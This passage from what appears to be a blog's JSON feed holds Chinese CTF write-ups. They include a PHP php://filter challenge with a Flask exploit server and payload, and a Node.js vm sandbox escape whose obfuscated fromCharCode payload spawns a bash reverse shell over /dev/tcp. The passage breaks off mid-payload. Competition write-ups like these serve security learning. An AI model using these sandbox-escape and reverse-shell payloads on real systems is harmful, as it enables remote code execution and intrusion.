/>\n&lt;td&gt;[2,3]&lt;/td&gt;<br />\n&lt;td&gt;6,9&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第三次 &lt;/td&gt;<br />\n&lt;th&gt;4&lt;/th&gt;<br />\n&lt;td&gt;[2,3]&lt;/td&gt;<br />\n&lt;td&gt;8&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第四次 &lt;/td&gt;<br />\n&lt;th&gt;5&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5]&lt;/td&gt;<br />\n&lt;td&gt;10,15,25&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第五次 &lt;/td&gt;<br />\n&lt;th&gt;6&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5]&lt;/td&gt;<br />\n&lt;td&gt;12&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第六次 &lt;/td&gt;<br />\n&lt;th&gt;7&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5,7]&lt;/td&gt;<br />\n&lt;td&gt;14,21,35,49&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第七次 &lt;/td&gt;<br />\n&lt;th&gt;8&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5,7]&lt;/td&gt;<br />\n&lt;td&gt;16&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;tr&gt;<br />\n&lt;td&gt; 第九次 &lt;/td&gt;<br />\n&lt;th&gt;9&lt;/th&gt;<br />\n&lt;td&gt;[2,3,5,7]&lt;/td&gt;<br />\n&lt;td&gt;18,27&lt;/td&gt;<br />\n&lt;/tr&gt;<br />\n&lt;/table&gt;</p>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8E%86%E5%B9%B4%E7%9C%9F%E9%A2%98/",
            "url": "http://yoursite.com/Algorithm/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8E%86%E5%B9%B4%E7%9C%9F%E9%A2%98/",
            "title": "蓝桥杯历年真题",
            "date_published": "2024-03-22T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"2023\"><a class=\"anchor\" href=\"#2023\">#</a> 2023</h1>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/CTF-WriteUp/2024%20HSCCTF/",
            "url": "http://yoursite.com/CTF-WriteUp/2024%20HSCCTF/",
            "title": "2024 VenomCTF",
            "date_published": "2024-03-21T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"checkin\"><a class=\"anchor\" href=\"#checkin\">#</a> CHECKIN</h1>\n<p><img data-src=\"/assets/CTF/checkin.jpg\" alt=\"\" /></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"php://filter/<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>/resource=/dev/null\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"2024\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>当<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>不输入内容时，</mtext></mrow><annotation encoding=\"application/x-tex\">a不输入内容时，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">不</span><span class=\"mord cjk_fallback\">输</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">内</span><span class=\"mord cjk_fallback\">容</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">，</span></span></span></span>b 为 <code>php://filter//resource=/dev/null</code></p>\n<p><code>file_get_contents</code>  作用是获取所选内容</p>\n<p><strong>exp (运行在服务器上)</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> defaults<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'path'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/&lt;path:path>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">catch_all</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'2024'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">6666</span><span class=\"token punctuation\">,</span> host<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li><code>@app.route()</code>  是 <code>Flask</code>  框架的一个装饰器，扩展原本函数功能的一种函数</li>\n<li><code>app = Flask(__name__)</code>  创建 <code>Flask</code>  类的实例</li>\n<li><code>@app.route('/', defaults=&#123;'path': ''&#125;)</code> ：访问 <code>127.0.0.1:6666</code>  触发函数 <code>catch_all</code> ，创建默认参数 <code>path</code>  为空字符串，此句的意义是 &lt;u&gt; 防止访问根路径时 path 为空，传参造成报错 &lt;/u&gt;</li>\n<li><code>@app.route('/&lt;path:path&gt;')</code> ：访问路径 <code>/path</code>  的中的 <code>path字符串</code> 传参给变量 <code>path</code> ，然后最后传给函数 <code>catch_all</code> ，因为上面 path 默认设置为空，所以 <code>exp</code>  的意思是 &lt;u&gt; 无论访问什么路径，都会得到 '2024' 的响应 &lt;/u&gt;</li>\n</ul>\n<p><strong>Payload</strong></p>\n<pre><code>POST传参\ncontent-type:application/x-www-form-urlencoded\n\nURL:http://91d4c737-deed-4020-8f66-fa27dfdafbf2.game.hscsec.cn:8080/\n\n传参Body:\n1=read=string.toupper/resource=http://23.94.212.183:6666\n\n拼接的payload:\nphp://filter//resource=/dev/null\n</code></pre>\n",
            "tags": [
                "CTF赛题",
                "CTF_WriteUp"
            ]
        },
        {
            "id": "http://yoursite.com/CTF-WriteUp/2023%20%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/",
            "url": "http://yoursite.com/CTF-WriteUp/2023%20%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/",
            "title": "2023 陕西省大学生网络安全大赛",
            "date_published": "2024-03-18T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"esc4pe_t0_mong0\"><a class=\"anchor\" href=\"#esc4pe_t0_mong0\">#</a> Esc4pe_T0_Mong0</h2>\n<p><code>node代码审计，constructor沙箱逃逸，绕过waf，反弹shell，mongodb</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Source Code<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//const &#123; MongoClient &#125; = require(\"mongodb\");</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//const client = new MongoClient(\"mongodb://localhost:27017/\");</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'vm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"express\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">const</span> bodyParser <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">isValidCode</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">code</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">const</span> isLengthValid <span class=\"token operator\">=</span> code<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">365</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">const</span> isASCII <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[\\x20-\\x7e]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">const</span> containsInvalidChars <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">[.\\[\\]&#123;&#125;\\s;`'\"/\\\\_&lt;>?:]</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">const</span> doesNotContainImport <span class=\"token operator\">=</span> <span class=\"token operator\">!</span>code<span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"import\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">const</span> doesNotContainUnescape <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">%(?:d0|d1|%[89abAB][0-9a-fA-F])</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      isLengthValid <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      isASCII <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token operator\">!</span>containsInvalidChars <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      doesNotContainImport <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      doesNotContainUnescape</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span> __dirname <span class=\"token operator\">+</span> <span class=\"token string\">\"/static/index.html\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/readfile'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">sendFile</span><span class=\"token punctuation\">(</span> __dirname <span class=\"token operator\">+</span> <span class=\"token string\">\"/app.js\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/exec'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">const</span> code <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>code<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> <span class=\"token string\">'Code is required.'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isValidCode</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token keyword\">const</span> sandbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token keyword\">const</span> script <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">vm<span class=\"token punctuation\">.</span>Script</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> script<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span>sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> result <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> err<span class=\"token punctuation\">.</span>message <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> <span class=\"token string\">'you cant bypass my vm best waf!'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">//app.get('/getflag', function (req, res) &#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">//    todo...</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">//&#125;);</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span><span class=\"token number\">3000</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">nodeapp listening on http://localhost:3000</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>审计源码，有长度限制和非法字符过滤，最后利用 <code>runInNewContext</code>  执行</p>\n<p><strong>反弹 shell payload</strong></p>\n<p><strong>Node RCE 方式</strong>：<em>获取 process 对象后，用 require 导入 child_process，再利用 child_process 执行命令，process 挂载在 global 上</em></p>\n<p><code>fromCharCode</code>  减少 payload 长度，利用  <code>this.constructor.constructor</code>  进行沙箱逃逸，利用 <code>with</code>  绕过对 <code>.</code>  的过滤</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>f<span class=\"token operator\">=</span>fromCharCode<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>constructor<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">=</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span>e<span class=\"token operator\">=</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span>t<span class=\"token operator\">=</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">117</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">110</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">=</span><span class=\"token number\">112</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token operator\">=</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token operator\">=</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span>mainModule<span class=\"token punctuation\">)</span><span class=\"token keyword\">with</span><span class=\"token punctuation\">(</span><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>h<span class=\"token operator\">=</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">34</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">,</span>h<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">105</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span><span class=\"token number\">38</span><span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token punctuation\">,</span><span class=\"token constant\">X</span><span class=\"token 